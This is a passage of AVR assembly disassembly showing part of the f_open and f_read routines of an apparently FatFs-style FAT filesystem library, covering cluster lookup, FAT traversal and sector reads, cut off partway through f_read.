    2c10:	67 c0       	rjmp	.+206    	; 0x2ce0 <f_open+0x188>
    2c12:	0e 94 e4 27 	call	0x4fc8	; 0x4fc8 <get_fattime>
    2c16:	4b 01       	movw	r8, r22
    2c18:	5c 01       	movw	r10, r24
    2c1a:	8b 8d       	ldd	r24, Y+27	; 0x1b
    2c1c:	9c 8d       	ldd	r25, Y+28	; 0x1c
    2c1e:	b5 01       	movw	r22, r10
    2c20:	a4 01       	movw	r20, r8
    2c22:	0e 96       	adiw	r24, 0x0e	; 14
    2c24:	0e 94 f2 06 	call	0xde4	; 0xde4 <st_dword>
    2c28:	8b 8d       	ldd	r24, Y+27	; 0x1b
    2c2a:	9c 8d       	ldd	r25, Y+28	; 0x1c
    2c2c:	b5 01       	movw	r22, r10
    2c2e:	a4 01       	movw	r20, r8
    2c30:	46 96       	adiw	r24, 0x16	; 22
    2c32:	0e 94 f2 06 	call	0xde4	; 0xde4 <st_dword>
    2c36:	ab 8c       	ldd	r10, Y+27	; 0x1b
    2c38:	bc 8c       	ldd	r11, Y+28	; 0x1c
    2c3a:	c9 a4       	ldd	r12, Y+41	; 0x29
    2c3c:	da a4       	ldd	r13, Y+42	; 0x2a
    2c3e:	b5 01       	movw	r22, r10
    2c40:	c6 01       	movw	r24, r12
    2c42:	0e 94 56 07 	call	0xeac	; 0xeac <ld_clust>
    2c46:	3b 01       	movw	r6, r22
    2c48:	4c 01       	movw	r8, r24
    2c4a:	80 e2       	ldi	r24, 0x20	; 32
    2c4c:	f5 01       	movw	r30, r10
    2c4e:	83 87       	std	Z+11, r24	; 0x0b
    2c50:	6b 8d       	ldd	r22, Y+27	; 0x1b
    2c52:	7c 8d       	ldd	r23, Y+28	; 0x1c
    2c54:	20 e0       	ldi	r18, 0x00	; 0
    2c56:	30 e0       	ldi	r19, 0x00	; 0
    2c58:	a9 01       	movw	r20, r18
    2c5a:	c6 01       	movw	r24, r12
    2c5c:	0e 94 81 07 	call	0xf02	; 0xf02 <st_clust>
    2c60:	8b 8d       	ldd	r24, Y+27	; 0x1b
    2c62:	9c 8d       	ldd	r25, Y+28	; 0x1c
    2c64:	40 e0       	ldi	r20, 0x00	; 0
    2c66:	50 e0       	ldi	r21, 0x00	; 0
    2c68:	ba 01       	movw	r22, r20
    2c6a:	4c 96       	adiw	r24, 0x1c	; 28
    2c6c:	0e 94 f2 06 	call	0xde4	; 0xde4 <st_dword>
    2c70:	e9 a5       	ldd	r30, Y+41	; 0x29
    2c72:	fa a5       	ldd	r31, Y+42	; 0x2a
    2c74:	81 e0       	ldi	r24, 0x01	; 1
    2c76:	83 83       	std	Z+3, r24	; 0x03
    2c78:	61 14       	cp	r6, r1
    2c7a:	71 04       	cpc	r7, r1
    2c7c:	81 04       	cpc	r8, r1
    2c7e:	91 04       	cpc	r9, r1
    2c80:	79 f1       	breq	.+94     	; 0x2ce0 <f_open+0x188>
    2c82:	c7 a4       	ldd	r12, Z+47	; 0x2f
    2c84:	d0 a8       	ldd	r13, Z+48	; 0x30
    2c86:	e1 a8       	ldd	r14, Z+49	; 0x31
    2c88:	f2 a8       	ldd	r15, Z+50	; 0x32
    2c8a:	00 e0       	ldi	r16, 0x00	; 0
    2c8c:	10 e0       	ldi	r17, 0x00	; 0
    2c8e:	98 01       	movw	r18, r16
    2c90:	b4 01       	movw	r22, r8
    2c92:	a3 01       	movw	r20, r6
    2c94:	ce 01       	movw	r24, r28
    2c96:	01 96       	adiw	r24, 0x01	; 1
    2c98:	1c da       	rcall	.-3016   	; 0x20d2 <remove_chain>
    2c9a:	18 2f       	mov	r17, r24
    2c9c:	81 11       	cpse	r24, r1
    2c9e:	20 c0       	rjmp	.+64     	; 0x2ce0 <f_open+0x188>
    2ca0:	b7 01       	movw	r22, r14
    2ca2:	a6 01       	movw	r20, r12
    2ca4:	89 a5       	ldd	r24, Y+41	; 0x29
    2ca6:	9a a5       	ldd	r25, Y+42	; 0x2a
    2ca8:	0e 94 68 08 	call	0x10d0	; 0x10d0 <move_window>
    2cac:	18 2f       	mov	r17, r24
    2cae:	e9 a5       	ldd	r30, Y+41	; 0x29
    2cb0:	fa a5       	ldd	r31, Y+42	; 0x2a
    2cb2:	d4 01       	movw	r26, r8
    2cb4:	c3 01       	movw	r24, r6
    2cb6:	01 97       	sbiw	r24, 0x01	; 1
    2cb8:	a1 09       	sbc	r26, r1
    2cba:	b1 09       	sbc	r27, r1
    2cbc:	83 87       	std	Z+11, r24	; 0x0b
    2cbe:	94 87       	std	Z+12, r25	; 0x0c
    2cc0:	a5 87       	std	Z+13, r26	; 0x0d
    2cc2:	b6 87       	std	Z+14, r27	; 0x0e
    2cc4:	0d c0       	rjmp	.+26     	; 0x2ce0 <f_open+0x188>
    2cc6:	11 11       	cpse	r17, r1
    2cc8:	0b c0       	rjmp	.+22     	; 0x2ce0 <f_open+0x188>
    2cca:	8d 81       	ldd	r24, Y+5	; 0x05
    2ccc:	84 fd       	sbrc	r24, 4
    2cce:	05 c0       	rjmp	.+10     	; 0x2cda <f_open+0x182>
    2cd0:	01 ff       	sbrs	r16, 1
    2cd2:	06 c0       	rjmp	.+12     	; 0x2ce0 <f_open+0x188>
    2cd4:	80 fd       	sbrc	r24, 0
    2cd6:	03 c0       	rjmp	.+6      	; 0x2cde <f_open+0x186>
    2cd8:	03 c0       	rjmp	.+6      	; 0x2ce0 <f_open+0x188>
    2cda:	14 e0       	ldi	r17, 0x04	; 4
    2cdc:	01 c0       	rjmp	.+2      	; 0x2ce0 <f_open+0x188>
    2cde:	17 e0       	ldi	r17, 0x07	; 7
    2ce0:	11 11       	cpse	r17, r1
    2ce2:	15 c0       	rjmp	.+42     	; 0x2d0e <f_open+0x1b6>
    2ce4:	53 fe       	sbrs	r5, 3
    2ce6:	03 c0       	rjmp	.+6      	; 0x2cee <f_open+0x196>
    2ce8:	f5 2d       	mov	r31, r5
    2cea:	f0 64       	ori	r31, 0x40	; 64
    2cec:	5f 2e       	mov	r5, r31
    2cee:	e9 a5       	ldd	r30, Y+41	; 0x29
    2cf0:	fa a5       	ldd	r31, Y+42	; 0x2a
    2cf2:	87 a5       	ldd	r24, Z+47	; 0x2f
    2cf4:	90 a9       	ldd	r25, Z+48	; 0x30
    2cf6:	a1 a9       	ldd	r26, Z+49	; 0x31
    2cf8:	b2 a9       	ldd	r27, Z+50	; 0x32
    2cfa:	ed a5       	ldd	r30, Y+45	; 0x2d
    2cfc:	fe a5       	ldd	r31, Y+46	; 0x2e
    2cfe:	84 8f       	std	Z+28, r24	; 0x1c
    2d00:	95 8f       	std	Z+29, r25	; 0x1d
    2d02:	a6 8f       	std	Z+30, r26	; 0x1e
    2d04:	b7 8f       	std	Z+31, r27	; 0x1f
    2d06:	8b 8d       	ldd	r24, Y+27	; 0x1b
    2d08:	9c 8d       	ldd	r25, Y+28	; 0x1c
    2d0a:	91 a3       	std	Z+33, r25	; 0x21
    2d0c:	80 a3       	std	Z+32, r24	; 0x20
    2d0e:	11 11       	cpse	r17, r1
    2d10:	9d c0       	rjmp	.+314    	; 0x2e4c <f_open+0x2f4>
    2d12:	6b 8c       	ldd	r6, Y+27	; 0x1b
    2d14:	7c 8c       	ldd	r7, Y+28	; 0x1c
    2d16:	29 a4       	ldd	r2, Y+41	; 0x29
    2d18:	3a a4       	ldd	r3, Y+42	; 0x2a
    2d1a:	b3 01       	movw	r22, r6
    2d1c:	c1 01       	movw	r24, r2
    2d1e:	0e 94 56 07 	call	0xeac	; 0xeac <ld_clust>
    2d22:	4b 01       	movw	r8, r22
    2d24:	5c 01       	movw	r10, r24
    2d26:	ed a5       	ldd	r30, Y+45	; 0x2d
    2d28:	fe a5       	ldd	r31, Y+46	; 0x2e
    2d2a:	66 83       	std	Z+6, r22	; 0x06
    2d2c:	77 83       	std	Z+7, r23	; 0x07
    2d2e:	80 87       	std	Z+8, r24	; 0x08
    2d30:	91 87       	std	Z+9, r25	; 0x09
    2d32:	c3 01       	movw	r24, r6
    2d34:	4c 96       	adiw	r24, 0x1c	; 28
    2d36:	0e 94 d3 06 	call	0xda6	; 0xda6 <ld_dword>
    2d3a:	6b 01       	movw	r12, r22
    2d3c:	7c 01       	movw	r14, r24
    2d3e:	ed a5       	ldd	r30, Y+45	; 0x2d
    2d40:	fe a5       	ldd	r31, Y+46	; 0x2e
    2d42:	62 87       	std	Z+10, r22	; 0x0a
    2d44:	73 87       	std	Z+11, r23	; 0x0b
    2d46:	84 87       	std	Z+12, r24	; 0x0c
    2d48:	95 87       	std	Z+13, r25	; 0x0d
    2d4a:	31 82       	std	Z+1, r3	; 0x01
    2d4c:	20 82       	st	Z, r2
    2d4e:	f1 01       	movw	r30, r2
    2d50:	85 81       	ldd	r24, Z+5	; 0x05
    2d52:	96 81       	ldd	r25, Z+6	; 0x06
    2d54:	ed a5       	ldd	r30, Y+45	; 0x2d
    2d56:	fe a5       	ldd	r31, Y+46	; 0x2e
    2d58:	93 83       	std	Z+3, r25	; 0x03
    2d5a:	82 83       	std	Z+2, r24	; 0x02
    2d5c:	56 86       	std	Z+14, r5	; 0x0e
    2d5e:	17 86       	std	Z+15, r1	; 0x0f
    2d60:	10 8e       	std	Z+24, r1	; 0x18
    2d62:	11 8e       	std	Z+25, r1	; 0x19
    2d64:	12 8e       	std	Z+26, r1	; 0x1a
    2d66:	13 8e       	std	Z+27, r1	; 0x1b
    2d68:	10 8a       	std	Z+16, r1	; 0x10
    2d6a:	11 8a       	std	Z+17, r1	; 0x11
    2d6c:	12 8a       	std	Z+18, r1	; 0x12
    2d6e:	13 8a       	std	Z+19, r1	; 0x13
    2d70:	55 fe       	sbrs	r5, 5
    2d72:	6c c0       	rjmp	.+216    	; 0x2e4c <f_open+0x2f4>
    2d74:	c1 14       	cp	r12, r1
    2d76:	d1 04       	cpc	r13, r1
    2d78:	e1 04       	cpc	r14, r1
    2d7a:	f1 04       	cpc	r15, r1
    2d7c:	09 f4       	brne	.+2      	; 0x2d80 <f_open+0x228>
    2d7e:	66 c0       	rjmp	.+204    	; 0x2e4c <f_open+0x2f4>
    2d80:	c0 8a       	std	Z+16, r12	; 0x10
    2d82:	d1 8a       	std	Z+17, r13	; 0x11
    2d84:	e2 8a       	std	Z+18, r14	; 0x12
    2d86:	f3 8a       	std	Z+19, r15	; 0x13
    2d88:	f1 01       	movw	r30, r2
    2d8a:	41 84       	ldd	r4, Z+9	; 0x09
    2d8c:	52 84       	ldd	r5, Z+10	; 0x0a
    2d8e:	61 2c       	mov	r6, r1
    2d90:	71 2c       	mov	r7, r1
    2d92:	03 2e       	mov	r0, r19
    2d94:	39 e0       	ldi	r19, 0x09	; 9
    2d96:	44 0c       	add	r4, r4
    2d98:	55 1c       	adc	r5, r5
    2d9a:	66 1c       	adc	r6, r6
    2d9c:	77 1c       	adc	r7, r7
    2d9e:	3a 95       	dec	r19
    2da0:	d1 f7       	brne	.-12     	; 0x2d96 <f_open+0x23e>
    2da2:	30 2d       	mov	r19, r0
    2da4:	19 c0       	rjmp	.+50     	; 0x2dd8 <f_open+0x280>
    2da6:	b5 01       	movw	r22, r10
    2da8:	a4 01       	movw	r20, r8
    2daa:	8d a5       	ldd	r24, Y+45	; 0x2d
    2dac:	9e a5       	ldd	r25, Y+46	; 0x2e
    2dae:	0e 94 5d 0d 	call	0x1aba	; 0x1aba <get_fat>
    2db2:	4b 01       	movw	r8, r22
    2db4:	5c 01       	movw	r10, r24
    2db6:	62 30       	cpi	r22, 0x02	; 2
    2db8:	71 05       	cpc	r23, r1
    2dba:	81 05       	cpc	r24, r1
    2dbc:	91 05       	cpc	r25, r1
    2dbe:	08 f4       	brcc	.+2      	; 0x2dc2 <f_open+0x26a>
    2dc0:	12 e0       	ldi	r17, 0x02	; 2
    2dc2:	8f ef       	ldi	r24, 0xFF	; 255
    2dc4:	88 16       	cp	r8, r24
    2dc6:	98 06       	cpc	r9, r24
    2dc8:	a8 06       	cpc	r10, r24
    2dca:	b8 06       	cpc	r11, r24
    2dcc:	09 f4       	brne	.+2      	; 0x2dd0 <f_open+0x278>
    2dce:	11 e0       	ldi	r17, 0x01	; 1
    2dd0:	c4 18       	sub	r12, r4
    2dd2:	d5 08       	sbc	r13, r5
    2dd4:	e6 08       	sbc	r14, r6
    2dd6:	f7 08       	sbc	r15, r7
    2dd8:	11 11       	cpse	r17, r1
    2dda:	05 c0       	rjmp	.+10     	; 0x2de6 <f_open+0x28e>
    2ddc:	4c 14       	cp	r4, r12
    2dde:	5d 04       	cpc	r5, r13
    2de0:	6e 04       	cpc	r6, r14
    2de2:	7f 04       	cpc	r7, r15
    2de4:	00 f3       	brcs	.-64     	; 0x2da6 <f_open+0x24e>
    2de6:	ed a5       	ldd	r30, Y+45	; 0x2d
    2de8:	fe a5       	ldd	r31, Y+46	; 0x2e
    2dea:	84 8a       	std	Z+20, r8	; 0x14
    2dec:	95 8a       	std	Z+21, r9	; 0x15
    2dee:	a6 8a       	std	Z+22, r10	; 0x16
    2df0:	b7 8a       	std	Z+23, r11	; 0x17
    2df2:	11 11       	cpse	r17, r1
    2df4:	2b c0       	rjmp	.+86     	; 0x2e4c <f_open+0x2f4>
    2df6:	d7 01       	movw	r26, r14
    2df8:	c6 01       	movw	r24, r12
    2dfa:	91 70       	andi	r25, 0x01	; 1
    2dfc:	aa 27       	eor	r26, r26
    2dfe:	bb 27       	eor	r27, r27
    2e00:	89 2b       	or	r24, r25
    2e02:	8a 2b       	or	r24, r26
    2e04:	8b 2b       	or	r24, r27
    2e06:	11 f1       	breq	.+68     	; 0x2e4c <f_open+0x2f4>
    2e08:	b5 01       	movw	r22, r10
    2e0a:	a4 01       	movw	r20, r8
    2e0c:	89 a5       	ldd	r24, Y+41	; 0x29
    2e0e:	9a a5       	ldd	r25, Y+42	; 0x2a
    2e10:	0e 94 28 07 	call	0xe50	; 0xe50 <clst2sect>
    2e14:	61 15       	cp	r22, r1
    2e16:	71 05       	cpc	r23, r1
    2e18:	81 05       	cpc	r24, r1
    2e1a:	91 05       	cpc	r25, r1
    2e1c:	b1 f0       	breq	.+44     	; 0x2e4a <f_open+0x2f2>
    2e1e:	0b 2e       	mov	r0, r27
    2e20:	b9 e0       	ldi	r27, 0x09	; 9
    2e22:	f6 94       	lsr	r15
    2e24:	e7 94       	ror	r14
    2e26:	d7 94       	ror	r13
    2e28:	c7 94       	ror	r12
    2e2a:	ba 95       	dec	r27
    2e2c:	d1 f7       	brne	.-12     	; 0x2e22 <f_open+0x2ca>
    2e2e:	b0 2d       	mov	r27, r0
    2e30:	dc 01       	movw	r26, r24
    2e32:	cb 01       	movw	r24, r22
    2e34:	8c 0d       	add	r24, r12
    2e36:	9d 1d       	adc	r25, r13
    2e38:	ae 1d       	adc	r26, r14
    2e3a:	bf 1d       	adc	r27, r15
    2e3c:	ed a5       	ldd	r30, Y+45	; 0x2d
    2e3e:	fe a5       	ldd	r31, Y+46	; 0x2e
    2e40:	80 8f       	std	Z+24, r24	; 0x18
    2e42:	91 8f       	std	Z+25, r25	; 0x19
    2e44:	a2 8f       	std	Z+26, r26	; 0x1a
    2e46:	b3 8f       	std	Z+27, r27	; 0x1b
    2e48:	01 c0       	rjmp	.+2      	; 0x2e4c <f_open+0x2f4>
    2e4a:	12 e0       	ldi	r17, 0x02	; 2
    2e4c:	11 23       	and	r17, r17
    2e4e:	41 f0       	breq	.+16     	; 0x2e60 <f_open+0x308>
    2e50:	ed a5       	ldd	r30, Y+45	; 0x2d
    2e52:	fe a5       	ldd	r31, Y+46	; 0x2e
    2e54:	11 82       	std	Z+1, r1	; 0x01
    2e56:	10 82       	st	Z, r1
    2e58:	81 2f       	mov	r24, r17
    2e5a:	03 c0       	rjmp	.+6      	; 0x2e62 <f_open+0x30a>
    2e5c:	89 e0       	ldi	r24, 0x09	; 9
    2e5e:	01 c0       	rjmp	.+2      	; 0x2e62 <f_open+0x30a>
    2e60:	81 2f       	mov	r24, r17
    2e62:	ae 96       	adiw	r28, 0x2e	; 46
    2e64:	0f b6       	in	r0, 0x3f	; 63
    2e66:	f8 94       	cli
    2e68:	de bf       	out	0x3e, r29	; 62
    2e6a:	0f be       	out	0x3f, r0	; 63
    2e6c:	cd bf       	out	0x3d, r28	; 61
    2e6e:	df 91       	pop	r29
    2e70:	cf 91       	pop	r28
    2e72:	1f 91       	pop	r17
    2e74:	0f 91       	pop	r16
    2e76:	ff 90       	pop	r15
    2e78:	ef 90       	pop	r14
    2e7a:	df 90       	pop	r13
    2e7c:	cf 90       	pop	r12
    2e7e:	bf 90       	pop	r11
    2e80:	af 90       	pop	r10
    2e82:	9f 90       	pop	r9
    2e84:	8f 90       	pop	r8
    2e86:	7f 90       	pop	r7
    2e88:	6f 90       	pop	r6
    2e8a:	5f 90       	pop	r5
    2e8c:	4f 90       	pop	r4
    2e8e:	3f 90       	pop	r3
    2e90:	2f 90       	pop	r2
    2e92:	08 95       	ret

00002e94 <f_read>:
    2e94:	2f 92       	push	r2
    2e96:	3f 92       	push	r3
    2e98:	4f 92       	push	r4
    2e9a:	5f 92       	push	r5
    2e9c:	6f 92       	push	r6
    2e9e:	7f 92       	push	r7
    2ea0:	8f 92       	push	r8
    2ea2:	9f 92       	push	r9
    2ea4:	af 92       	push	r10
    2ea6:	bf 92       	push	r11
    2ea8:	cf 92       	push	r12
    2eaa:	df 92       	push	r13
    2eac:	ef 92       	push	r14
    2eae:	ff 92       	push	r15
    2eb0:	0f 93       	push	r16
    2eb2:	1f 93       	push	r17
    2eb4:	cf 93       	push	r28
    2eb6:	df 93       	push	r29
    2eb8:	cd b7       	in	r28, 0x3d	; 61
    2eba:	de b7       	in	r29, 0x3e	; 62
    2ebc:	28 97       	sbiw	r28, 0x08	; 8
    2ebe:	0f b6       	in	r0, 0x3f	; 63
    2ec0:	f8 94       	cli
    2ec2:	de bf       	out	0x3e, r29	; 62
    2ec4:	0f be       	out	0x3f, r0	; 63
    2ec6:	cd bf       	out	0x3d, r28	; 61
    2ec8:	7c 01       	movw	r14, r24
    2eca:	3b 01       	movw	r6, r22
    2ecc:	5a 01       	movw	r10, r20
    2ece:	49 01       	movw	r8, r18
    2ed0:	f9 01       	movw	r30, r18
    2ed2:	11 82       	std	Z+1, r1	; 0x01
    2ed4:	10 82       	st	Z, r1
    2ed6:	8d 83       	std	Y+5, r24	; 0x05
    2ed8:	fe 82       	std	Y+6, r15	; 0x06
    2eda:	be 01       	movw	r22, r28
    2edc:	6f 5f       	subi	r22, 0xFF	; 255
    2ede:	7f 4f       	sbci	r23, 0xFF	; 255
    2ee0:	0e 94 dc 07 	call	0xfb8	; 0xfb8 <validate>
    2ee4:	81 11       	cpse	r24, r1
    2ee6:	28 c1       	rjmp	.+592    	; 0x3138 <f_read+0x2a4>
    2ee8:	f7 01       	movw	r30, r14
    2eea:	87 85       	ldd	r24, Z+15	; 0x0f
    2eec:	81 11       	cpse	r24, r1
    2eee:	24 c1       	rjmp	.+584    	; 0x3138 <f_read+0x2a4>
    2ef0:	86 85       	ldd	r24, Z+14	; 0x0e
    2ef2:	80 ff       	sbrs	r24, 0
    2ef4:	20 c1       	rjmp	.+576    	; 0x3136 <f_read+0x2a2>
    2ef6:	82 85       	ldd	r24, Z+10	; 0x0a
    2ef8:	93 85       	ldd	r25, Z+11	; 0x0b
    2efa:	a4 85       	ldd	r26, Z+12	; 0x0c
    2efc:	b5 85       	ldd	r27, Z+13	; 0x0d
    2efe:	40 89       	ldd	r20, Z+16	; 0x10
    2f00:	51 89       	ldd	r21, Z+17	; 0x11
    2f02:	62 89       	ldd	r22, Z+18	; 0x12
    2f04:	73 89       	ldd	r23, Z+19	; 0x13
    2f06:	84 1b       	sub	r24, r20
    2f08:	95 0b       	sbc	r25, r21
    2f0a:	a6 0b       	sbc	r26, r22
    2f0c:	b7 0b       	sbc	r27, r23
    2f0e:	a5 01       	movw	r20, r10
    2f10:	60 e0       	ldi	r22, 0x00	; 0
    2f12:	70 e0       	ldi	r23, 0x00	; 0
    2f14:	84 17       	cp	r24, r20
    2f16:	95 07       	cpc	r25, r21
    2f18:	a6 07       	cpc	r26, r22
    2f1a:	b7 07       	cpc	r27, r23
    2f1c:	08 f0       	brcs	.+2      	; 0x2f20 <f_read+0x8c>
    2f1e:	05 c1       	rjmp	.+522    	; 0x312a <f_read+0x296>
    2f20:	5c 01       	movw	r10, r24
    2f22:	03 c1       	rjmp	.+518    	; 0x312a <f_read+0x296>
    2f24:	f7 01       	movw	r30, r14
    2f26:	80 89       	ldd	r24, Z+16	; 0x10
    2f28:	91 89       	ldd	r25, Z+17	; 0x11
    2f2a:	a2 89       	ldd	r26, Z+18	; 0x12
    2f2c:	b3 89       	ldd	r27, Z+19	; 0x13
    2f2e:	ac 01       	movw	r20, r24
    2f30:	bd 01       	movw	r22, r26
    2f32:	51 70       	andi	r21, 0x01	; 1
    2f34:	66 27       	eor	r22, r22
    2f36:	77 27       	eor	r23, r23
    2f38:	45 2b       	or	r20, r21
    2f3a:	46 2b       	or	r20, r22
    2f3c:	47 2b       	or	r20, r23
    2f3e:	09 f0       	breq	.+2      	; 0x2f42 <f_read+0xae>
    2f40:	ac c0       	rjmp	.+344    	; 0x309a <f_read+0x206>
    2f42:	e9 81       	ldd	r30, Y+1	; 0x01
    2f44:	fa 81       	ldd	r31, Y+2	; 0x02
    2f46:	01 85       	ldd	r16, Z+9	; 0x09
    2f48:	12 85       	ldd	r17, Z+10	; 0x0a
    2f4a:	01 50       	subi	r16, 0x01	; 1
    2f4c:	11 09       	sbc	r17, r1
    2f4e:	ac 01       	movw	r20, r24
    2f50:	bd 01       	movw	r22, r26
    2f52:	03 2e       	mov	r0, r19
    2f54:	39 e0       	ldi	r19, 0x09	; 9
    2f56:	76 95       	lsr	r23
    2f58:	67 95       	ror	r22
    2f5a:	57 95       	ror	r21
    2f5c:	47 95       	ror	r20
    2f5e:	3a 95       	dec	r19
    2f60:	d1 f7       	brne	.-12     	; 0x2f56 <f_read+0xc2>
    2f62:	30 2d       	mov	r19, r0
    2f64:	04 23       	and	r16, r20
    2f66:	15 23       	and	r17, r21
    2f68:	01 15       	cp	r16, r1
    2f6a:	11 05       	cpc	r17, r1
    2f6c:	59 f5       	brne	.+86     	; 0x2fc4 <f_read+0x130>
    2f6e:	89 2b       	or	r24, r25
    2f70:	8a 2b       	or	r24, r26
    2f72:	8b 2b       	or	r24, r27
    2f74:	31 f4       	brne	.+12     	; 0x2f82 <f_read+0xee>
    2f76:	f7 01       	movw	r30, r14
    2f78:	66 81       	ldd	r22, Z+6	; 0x06
    2f7a:	77 81       	ldd	r23, Z+7	; 0x07
    2f7c:	80 85       	ldd	r24, Z+8	; 0x08
    2f7e:	91 85       	ldd	r25, Z+9	; 0x09
    2f80:	09 c0       	rjmp	.+18     	; 0x2f94 <f_read+0x100>
    2f82:	f7 01       	movw	r30, r14
    2f84:	44 89       	ldd	r20, Z+20	; 0x14
    2f86:	55 89       	ldd	r21, Z+21	; 0x15
    2f88:	66 89       	ldd	r22, Z+22	; 0x16
    2f8a:	77 89       	ldd	r23, Z+23	; 0x17
    2f8c:	8d 81       	ldd	r24, Y+5	; 0x05
    2f8e:	9e 81       	ldd	r25, Y+6	; 0x06
    2f90:	0e 94 5d 0d 	call	0x1aba	; 0x1aba <get_fat>
    2f94:	62 30       	cpi	r22, 0x02	; 2
    2f96:	71 05       	cpc	r23, r1
    2f98:	81 05       	cpc	r24, r1
    2f9a:	91 05       	cpc	r25, r1
    2f9c:	20 f4       	brcc	.+8      	; 0x2fa6 <f_read+0x112>
    2f9e:	82 e0       	ldi	r24, 0x02	; 2
    2fa0:	f7 01       	movw	r30, r14
    2fa2:	87 87       	std	Z+15, r24	; 0x0f
    2fa4:	c9 c0       	rjmp	.+402    	; 0x3138 <f_read+0x2a4>
    2fa6:	6f 3f       	cpi	r22, 0xFF	; 255
    2fa8:	ff ef       	ldi	r31, 0xFF	; 255
    2faa:	7f 07       	cpc	r23, r31
    2fac:	8f 07       	cpc	r24, r31
    2fae:	9f 07       	cpc	r25, r31
    2fb0:	21 f4       	brne	.+8      	; 0x2fba <f_read+0x126>
    2fb2:	81 e0       	ldi	r24, 0x01	; 1
    2fb4:	f7 01       	movw	r30, r14
    2fb6:	87 87       	std	Z+15, r24	; 0x0f
    2fb8:	bf c0       	rjmp	.+382    	; 0x3138 <f_read+0x2a4>
    2fba:	f7 01       	movw	r30, r14
    2fbc:	64 8b       	std	Z+20, r22	; 0x14
    2fbe:	75 8b       	std	Z+21, r23	; 0x15
    2fc0:	86 8b       	std	Z+22, r24	; 0x16
    2fc2:	97 8b       	std	Z+23, r25	; 0x17
    2fc4:	f7 01       	movw	r30, r14
    2fc6:	44 89       	ldd	r20, Z+20	; 0x14
    2fc8:	55 89       	ldd	r21, Z+21	; 0x15
    2fca:	66 89       	ldd	r22, Z+22	; 0x16
    2fcc:	77 89       	ldd	r23, Z+23	; 0x17
    2fce:	89 81       	ldd	r24, Y+1	; 0x01
    2fd0:	9a 81       	ldd	r25, Y+2	; 0x02
    2fd2:	9c 83       	std	Y+4, r25	; 0x04
    2fd4:	8b 83       	std	Y+3, r24	; 0x03
    2fd6:	0e 94 28 07 	call	0xe50	; 0xe50 <clst2sect>
    2fda:	61 15       	cp	r22, r1
    2fdc:	71 05       	cpc	r23, r1
    2fde:	81 05       	cpc	r24, r1
    2fe0:	91 05       	cpc	r25, r1
    2fe2:	21 f4       	brne	.+8      	; 0x2fec <f_read+0x158>
    2fe4:	82 e0       	ldi	r24, 0x02	; 2
    2fe6:	f7 01       	movw	r30, r14
    2fe8:	87 87       	std	Z+15, r24	; 0x0f
    2fea:	a6 c0       	rjmp	.+332    	; 0x3138 <f_read+0x2a4>
    2fec:	1b 01       	movw	r2, r22
    2fee:	2c 01       	movw	r4, r24
    2ff0:	20 0e       	add	r2, r16
    2ff2:	31 1e       	adc	r3, r17
    2ff4:	41 1c       	adc	r4, r1
    2ff6:	51 1c       	adc	r5, r1
    2ff8:	65 01       	movw	r12, r10
    2ffa:	cd 2c       	mov	r12, r13
    2ffc:	dd 24       	eor	r13, r13
    2ffe:	c6 94       	lsr	r12
    3000:	c1 14       	cp	r12, r1
    3002:	d1 04       	cpc	r13, r1
    3004:	09 f4       	brne	.+2      	; 0x3008 <f_read+0x174>
    3006:	44 c0       	rjmp	.+136    	; 0x3090 <f_read+0x1fc>
    3008:	eb 81       	ldd	r30, Y+3	; 0x03
    300a:	fc 81       	ldd	r31, Y+4	; 0x04
    300c:	21 85       	ldd	r18, Z+9	; 0x09
    300e:	32 85       	ldd	r19, Z+10	; 0x0a
    3010:	c8 01       	movw	r24, r16
    3012:	8c 0d       	add	r24, r12
    3014:	9d 1d       	adc	r25, r13
    3016:	28 17       	cp	r18, r24
    3018:	39 07       	cpc	r19, r25
    301a:	18 f4       	brcc	.+6      	; 0x3022 <f_read+0x18e>
    301c:	69 01       	movw	r12, r18
    301e:	c0 1a       	sub	r12, r16
    3020:	d1 0a       	sbc	r13, r17
    3022:	86 01       	movw	r16, r12
    3024:	a2 01       	movw	r20, r4
    3026:	91 01       	movw	r18, r2
    3028:	b3 01       	movw	r22, r6
    302a:	eb 81       	ldd	r30, Y+3	; 0x03
    302c:	fc 81       	ldd	r31, Y+4	; 0x04
    302e:	81 81       	ldd	r24, Z+1	; 0x01
    3030:	0e 94 9d 06 	call	0xd3a	; 0xd3a <disk_read>
    3034:	88 23       	and	r24, r24
    3036:	21 f0       	breq	.+8      	; 0x3040 <f_read+0x1ac>
    3038:	81 e0       	ldi	r24, 0x01	; 1
    303a:	f7 01       	movw	r30, r14
    303c:	87 87       	std	Z+15, r24	; 0x0f
    303e:	7c c0       	rjmp	.+248    	; 0x3138 <f_read+0x2a4>
    3040:	e9 81       	ldd	r30, Y+1	; 0x01
    3042:	fa 81       	ldd	r31, Y+2	; 0x02
    3044:	83 81       	ldd	r24, Z+3	; 0x03
    3046:	88 23       	and	r24, r24
    3048:	f9 f0       	breq	.+62     	; 0x3088 <f_read+0x1f4>
    304a:	87 a5       	ldd	r24, Z+47	; 0x2f
    304c:	90 a9       	ldd	r25, Z+48	; 0x30
    304e:	a1 a9       	ldd	r26, Z+49	; 0x31
    3050:	b2 a9       	ldd	r27, Z+50	; 0x32
    3052:	82 19       	sub	r24, r2
    3054:	93 09       	sbc	r25, r3
    3056:	a4 09       	sbc	r26, r4
    3058:	b5 09       	sbc	r27, r5
    305a:	a6 01       	movw	r20, r12
    305c:	60 e0       	ldi	r22, 0x00	; 0
    305e:	70 e0       	ldi	r23, 0x00	; 0
    3060:	84 17       	cp	r24, r20
    3062:	95 07       	cpc	r25, r21
    3064:	a6 07       	cpc	r26, r22
    3066:	b7 07       	cpc	r27, r23
    3068:	78 f4       	brcc	.+30     	; 0x3088 <f_read+0x1f4>
    306a:	f3 96       	adiw	r30, 0x33	; 51
    306c:	28 2f       	mov	r18, r24
    306e:	22 0f       	add	r18, r18
    3070:	28 87       	std	Y+8, r18	; 0x08
    3072:	1f 82       	std	Y+7, r1	; 0x07
    3074:	af 81       	ldd	r26, Y+7	; 0x07
    3076:	b8 85       	ldd	r27, Y+8	; 0x08
    3078:	a6 0d       	add	r26, r6
    307a:	b7 1d       	adc	r27, r7
    307c:	80 e0       	ldi	r24, 0x00	; 0
    307e:	92 e0       	ldi	r25, 0x02	; 2
    3080:	01 90       	ld	r0, Z+
    3082:	0d 92       	st	X+, r0
    3084:	01 97       	sbiw	r24, 0x01	; 1
    3086:	e1 f7       	brne	.-8      	; 0x3080 <f_read+0x1ec>
    3088:	dc 2c       	mov	r13, r12
    308a:	cc 24       	eor	r12, r12
    308c:	dd 0c       	add	r13, r13
    308e:	35 c0       	rjmp	.+106    	; 0x30fa <f_read+0x266>
    3090:	f7 01       	movw	r30, r14
